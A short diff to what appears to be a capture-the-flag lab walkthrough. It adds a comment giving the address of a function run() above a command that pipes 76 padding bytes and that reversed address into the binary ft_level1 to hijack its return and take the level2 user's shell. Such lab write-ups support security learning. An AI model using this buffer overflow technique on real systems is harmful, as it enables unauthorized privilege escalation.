@@ -56,6 +56,8 @@ su level2
 
 # As user level1:
 
+	# Function run() is at address 0x08048464
+
 	# Run the program
 	(python -c "print('A' * 76) + '\x08\x04\x84\x64'[::-1]"; cat) | /home/user/level2/ft_level1
 
